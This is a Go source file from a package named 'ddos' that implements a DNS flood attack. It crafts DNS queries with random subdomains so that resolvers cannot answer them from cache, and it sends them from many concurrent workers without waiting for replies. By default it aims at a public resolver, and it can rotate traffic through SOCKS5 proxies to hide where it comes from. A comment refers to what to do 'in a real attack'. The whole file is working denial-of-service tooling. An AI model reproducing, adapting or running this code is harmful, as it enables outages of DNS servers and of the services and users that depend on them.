package ddos

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

// DNS query types (RFC 1035)
const (
	DNSQueryTypeA     = 1  // IPv4 address
	DNSQueryTypeNS    = 2  // Name server
	DNSQueryTypeMX    = 15 // Mail exchange
	DNSQueryTypeTXT   = 16 // Text record
	DNSQueryTypeAAAA  = 28 // IPv6 address
)

// DNSQueryBuilder generates DNS query packets
type DNSQueryBuilder struct {
	targetDomain     string
	randomSubdomains bool
	queryTypes       []uint16
	mu               sync.RWMutex
}

// NewDNSQueryBuilder creates a new DNS query builder
func NewDNSQueryBuilder(targetDomain string, queryTypes []string, randomSubdomains bool) *DNSQueryBuilder {
	builder := &DNSQueryBuilder{
		targetDomain:     strings.TrimSuffix(targetDomain, "."),
		randomSubdomains: randomSubdomains,
	}

	// Parse query types
	if len(queryTypes) == 0 {
		// Default: use all query types for randomization
		builder.queryTypes = []uint16{DNSQueryTypeA, DNSQueryTypeAAAA, DNSQueryTypeMX, DNSQueryTypeTXT, DNSQueryTypeNS}
	} else {
		typeMap := map[string]uint16{
			"A":     DNSQueryTypeA,
			"AAAA":  DNSQueryTypeAAAA,
			"MX":    DNSQueryTypeMX,
			"TXT":   DNSQueryTypeTXT,
			"NS":    DNSQueryTypeNS,
		}
		for _, qtype := range queryTypes {
			if t, ok := typeMap[strings.ToUpper(qtype)]; ok {
				builder.queryTypes = append(builder.queryTypes, t)
			}
		}
		// If no valid types found, default to A
		if len(builder.queryTypes) == 0 {
			builder.queryTypes = []uint16{DNSQueryTypeA}
		}
	}

	return builder
}

// generateRandomSubdomain generates a random subdomain string
func generateRandomSubdomain() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	rand.Read(b)
	for i := range b {
		b[i] = charset[b[i]%byte(len(charset))]
	}
	return string(b)
}

// BuildQuery builds a DNS query packet
func (b *DNSQueryBuilder) BuildQuery() ([]byte, string, error) {
	b.mu.RLock()
	defer b.mu.RUnlock()

	// Generate domain name
	var domain string
	if b.randomSubdomains {
		domain = generateRandomSubdomain() + "." + b.targetDomain
	} else {
		domain = b.targetDomain
	}

	// Select random query type
	queryType := b.queryTypes[0]
	if len(b.queryTypes) > 1 {
		var idx [1]byte
		rand.Read(idx[:])
		queryType = b.queryTypes[int(idx[0])%len(b.queryTypes)]
	}

	// Generate random transaction ID
	var txID [2]byte
	rand.Read(txID[:])

	// Build DNS packet (RFC 1035)
	packet := make([]byte, 0, 512)

	// Header (12 bytes)
	packet = append(packet, txID[0], txID[1]) // Transaction ID
	packet = append(packet, 0x01, 0x00)        // Flags: standard query, recursion desired
	packet = append(packet, 0x00, 0x01)        // Questions: 1
	packet = append(packet, 0x00, 0x00)        // Answer RRs: 0
	packet = append(packet, 0x00, 0x00)        // Authority RRs: 0
	packet = append(packet, 0x00, 0x00)        // Additional RRs: 0

	// Question section
	// Domain name (encoded)
	parts := strings.Split(domain, ".")
	for _, part := range parts {
		if len(part) > 63 {
			part = part[:63] // Max label length
		}
		packet = append(packet, byte(len(part)))
		packet = append(packet, []byte(part)...)
	}
	packet = append(packet, 0x00) // Null terminator

	// Query type (2 bytes)
	typeBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(typeBytes, queryType)
	packet = append(packet, typeBytes...)

	// Query class: IN (0x0001)
	packet = append(packet, 0x00, 0x01)

	return packet, domain, nil
}

// UDPConnectionPool manages UDP connections for DNS queries
type UDPConnectionPool struct {
	connections []*net.UDPConn
	index       int64
	mu          sync.RWMutex
}

// NewUDPConnectionPool creates a new UDP connection pool
func NewUDPConnectionPool(size int, targetAddr *net.UDPAddr) (*UDPConnectionPool, error) {
	pool := &UDPConnectionPool{
		connections: make([]*net.UDPConn, 0, size),
	}

	// Create UDP connections
	for i := 0; i < size; i++ {
		conn, err := net.DialUDP("udp", nil, targetAddr)
		if err != nil {
			// If connection fails, continue with available connections
			continue
		}
		pool.connections = append(pool.connections, conn)
	}

	if len(pool.connections) == 0 {
		return nil, fmt.Errorf("failed to create any UDP connections")
	}

	return pool, nil
}

// GetConnection returns a UDP connection from the pool (round-robin)
func (p *UDPConnectionPool) GetConnection() *net.UDPConn {
	if len(p.connections) == 0 {
		return nil
	}
	idx := atomic.AddInt64(&p.index, 1) - 1
	return p.connections[int(idx)%len(p.connections)]
}

// Close closes all connections in the pool
func (p *UDPConnectionPool) Close() {
	p.mu.Lock()
	defer p.mu.Unlock()
	for _, conn := range p.connections {
		if conn != nil {
			conn.Close()
		}
	}
}

// startDNSFloodAttack starts DNS flood attack
func (d *DDoSAttack) startDNSFloodAttack() {
	d.startDNSFloodWorkers(d.config.MaxThreads)
}

// startDNSFloodWorkers starts DNS flood workers
func (d *DDoSAttack) startDNSFloodWorkers(numWorkers int) {
	// Validate DNS configuration
	if d.config.DNSTargetDomain == "" {
		// Try to extract domain from TargetURL if DNSTargetDomain is not set
		if d.config.TargetURL != "" {
			// Extract domain from URL
			if strings.HasPrefix(d.config.TargetURL, "http://") {
				d.config.DNSTargetDomain = strings.TrimPrefix(d.config.TargetURL, "http://")
			} else if strings.HasPrefix(d.config.TargetURL, "https://") {
				d.config.DNSTargetDomain = strings.TrimPrefix(d.config.TargetURL, "https://")
			} else {
				d.config.DNSTargetDomain = d.config.TargetURL
			}
			// Remove path and port
			if idx := strings.Index(d.config.DNSTargetDomain, "/"); idx != -1 {
				d.config.DNSTargetDomain = d.config.DNSTargetDomain[:idx]
			}
			if idx := strings.Index(d.config.DNSTargetDomain, ":"); idx != -1 {
				d.config.DNSTargetDomain = d.config.DNSTargetDomain[:idx]
			}
		}
		if d.config.DNSTargetDomain == "" {
			return
		}
	}

	// Set defaults for DNS config
	if len(d.config.DNSQueryTypes) == 0 {
		d.config.DNSQueryTypes = []string{} // Empty = random
	}
	if !d.config.DNSRandomSubdomains {
		d.config.DNSRandomSubdomains = true // Default to true
	}

	// Resolve DNS server address
	var dnsServerAddr *net.UDPAddr
	var err error

	if d.config.DNSResolverIP != "" {
		// Use specified resolver
		dnsServerAddr, err = net.ResolveUDPAddr("udp", net.JoinHostPort(d.config.DNSResolverIP, "53"))
	} else {
		// Auto-detect: resolve the target domain's authoritative DNS servers
		// For simplicity, use a common public DNS resolver (8.8.8.8) or resolve target domain
		// In a real attack, you'd want to query the domain's NS records
		// For now, use Google DNS as default resolver
		dnsServerAddr, err = net.ResolveUDPAddr("udp", "8.8.8.8:53")
	}
	if err != nil {
		return
	}

	// Create DNS query builder
	queryBuilder := NewDNSQueryBuilder(d.config.DNSTargetDomain, d.config.DNSQueryTypes, d.config.DNSRandomSubdomains)

	// Start workers
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.dnsFloodWorker(dnsServerAddr, queryBuilder)
	}
}

// dnsFloodWorker performs DNS flood attack
func (d *DDoSAttack) dnsFloodWorker(dnsServerAddr *net.UDPAddr, queryBuilder *DNSQueryBuilder) {
	defer func() {
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
		}
		d.wg.Done()
	}()

	// Create UDP connection (with proxy support if available)
	var conn net.Conn
	var err error
	var usedProxy string

	// Try to use proxy if available
	if d.proxyManager != nil {
		if proxyURL, ok := d.getNextProxy(); ok {
			usedProxy = proxyURL
			conn, err = d.dialUDPThroughProxy(proxyURL, dnsServerAddr)
			if err != nil {
				d.markProxyFailure(usedProxy)
				usedProxy = ""
			}
		}
	}

	// Fallback to direct connection
	if conn == nil {
		conn, err = net.DialUDP("udp", nil, dnsServerAddr)
		if err != nil {
			return
		}
		defer conn.Close()
	} else {
		defer conn.Close()
	}

	// Set write deadline
	conn.SetWriteDeadline(time.Now().Add(d.config.Timeout))

	// Buffered channel for queries (producer-consumer pattern)
	queryChan := make(chan []byte, 1000)

	// Producer: continuously build queries
	producerDone := make(chan struct{})
	go func() {
		defer func() {
			select {
			case <-producerDone:
			default:
				close(producerDone)
			}
			if r := recover(); r != nil {
				atomic.AddInt64(&d.requestsFailed, 1)
			}
		}()

		for {
			select {
			case <-d.ctx.Done():
				return
			default:
				query, _, err := queryBuilder.BuildQuery()
				if err != nil {
					atomic.AddInt64(&d.requestsFailed, 1)
					continue
				}

				// Non-blocking send
				select {
				case queryChan <- query:
				case <-d.ctx.Done():
					return
				default:
					// Channel full, skip this query
					atomic.AddInt64(&d.requestsFailed, 1)
				}
			}
		}
	}()

	// Consumer: send queries (fire-and-forget)
	for {
		select {
		case <-d.ctx.Done():
			select {
			case <-producerDone:
			case <-time.After(5 * time.Second):
			}
			return
		case query, ok := <-queryChan:
			if !ok {
				return
			}
			if query == nil {
				continue
			}

			// Rate limiting
			if d.rateLimiter != nil && !d.rateLimiter.Allow() {
				atomic.AddInt64(&d.requestsFailed, 1)
				continue
			}

			atomic.AddInt64(&d.requestsSent, 1)
			atomic.AddInt64(&d.bytesSent, int64(len(query)))
			atomic.AddInt64(&d.activeConns, 1)

			// Send query (fire-and-forget)
			startTime := time.Now()
			_, err := conn.Write(query)
			if err != nil {
				atomic.AddInt64(&d.requestsFailed, 1)
				if usedProxy != "" {
					d.markProxyFailure(usedProxy)
				}
				// Try to reconnect
				conn.Close()
				if usedProxy != "" {
					if proxyURL, ok := d.getNextProxy(); ok {
						usedProxy = proxyURL
						conn, err = d.dialUDPThroughProxy(proxyURL, dnsServerAddr)
						if err != nil {
							d.markProxyFailure(usedProxy)
							usedProxy = ""
						}
					}
				}
				if conn == nil {
					conn, err = net.DialUDP("udp", nil, dnsServerAddr)
					if err != nil {
						return
					}
				}
				conn.SetWriteDeadline(time.Now().Add(d.config.Timeout))
			} else {
				atomic.AddInt64(&d.requestsSuccess, 1)
				if usedProxy != "" {
					responseTime := time.Since(startTime)
					d.markProxySuccess(usedProxy, responseTime)
				}
			}
			atomic.AddInt64(&d.activeConns, -1)
		}
	}
}

// dialUDPThroughProxy creates a UDP connection through a SOCKS5 proxy
func (d *DDoSAttack) dialUDPThroughProxy(proxyURL string, targetAddr *net.UDPAddr) (net.Conn, error) {
	// Parse proxy URL
	parsed, err := parseProxyURL(proxyURL)
	if err != nil {
		return nil, err
	}

	// Only SOCKS5 supports UDP
	if parsed.Scheme != "socks5" && parsed.Scheme != "socks5h" {
		// HTTP proxies don't support UDP, fallback to direct
		return net.DialUDP("udp", nil, targetAddr)
	}

	// Create SOCKS5 dialer
	var auth *proxy.Auth
	if parsed.User != nil {
		password, _ := parsed.User.Password()
		auth = &proxy.Auth{
			User:     parsed.User.Username(),
			Password: password,
		}
	}

	dialer, err := proxy.SOCKS5("tcp", parsed.Host, auth, proxy.Direct)
	if err != nil {
		return nil, err
	}

	// Dial UDP through SOCKS5
	// Note: SOCKS5 UDP association requires a TCP control connection first
	// For simplicity, we'll use direct UDP if SOCKS5 UDP fails
	conn, err := dialer.Dial("udp", targetAddr.String())
	if err != nil {
		// Fallback to direct connection
		return net.DialUDP("udp", nil, targetAddr)
	}

	return conn, nil
}

// parseProxyURL parses a proxy URL (helper function)
func parseProxyURL(proxyURL string) (*url.URL, error) {
	// Handle IP:port format
	if !strings.Contains(proxyURL, "://") {
		proxyURL = "socks5://" + proxyURL
	}
	return url.Parse(proxyURL)
}

